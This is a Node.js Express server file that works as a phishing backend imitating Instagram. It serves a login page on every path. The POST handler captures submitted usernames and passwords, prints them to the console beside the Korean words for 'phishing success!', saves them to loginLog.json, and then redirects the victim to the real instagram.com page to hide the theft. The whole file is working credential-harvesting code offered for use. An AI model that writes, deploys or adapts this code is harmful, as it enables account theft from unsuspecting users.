const express = require("express");
const app = express();
const morgan = require('morgan');
const path = require("path");
const bodyParser = require('body-parser');
const ejs = require("ejs");
const fs = require("node:fs");

app.engine("html", ejs.renderFile);
app.set("view engine", "html");
const dataDir = path.resolve(`${process.cwd()}${path.sep}`);
const templateDir = path.resolve(`${dataDir}${path.sep}views`);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.resolve(`${dataDir}${path.sep}assets`)));

const accessLogStream = fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' });
app.use(morgan('combined', { stream: accessLogStream }));

const renderTemplate = (res, req, template, data = {}) => {
  res.render(path.resolve(`${templateDir}${path.sep}${template}`), { ...data });
};

app.use((err, req, res, next) => {
  console.error(err);
  res.send(err);
});

app.get('/*', (req, res) => {
  const currentUrl = req.path;
  renderTemplate(res, req, "index.ejs", { currentUrl });
})

app.post('/', (req, res) => {
  const { username, password, currentUrl } = req.body;
  
  console.log(
    "\x1b[37m%s\x1b[0m\x1b[1m\x1b[31m%s\x1b[0m\n" +
    "\x1b[90m  > ID : \x1b[37m%s\n" +
    "\x1b[90m  > PW : \x1b[37m%s\x1b[0m",
    "[ 💀 ] ", 
    "피싱 성공!",
    username,
    password
  );

  const newUser = { date: new Date(), username, password };
  
  fs.readFile("./loginLog.json", 'utf8', (err, data) => {
      if (err) {
        console.error("파일을 읽는 중 오류가 발생했습니다:", err);
        return;
      }
    
      let jsonData = JSON.parse(data);
      jsonData.users.unshift(newUser);
      const updatedJsonData = JSON.stringify(jsonData, null, 2);
    
      fs.writeFile("./loginLog.json", updatedJsonData, 'utf8', (err) => {
        if (err) {
          console.error("파일을 저장하는 중 오류가 발생했습니다:", err);
          return;
        }
        res.redirect(`https://www.instagram.com${currentUrl}`)
      });
    });
});

app.listen(3000, () => {
  console.log(`HTTP server started on port 3000`);
});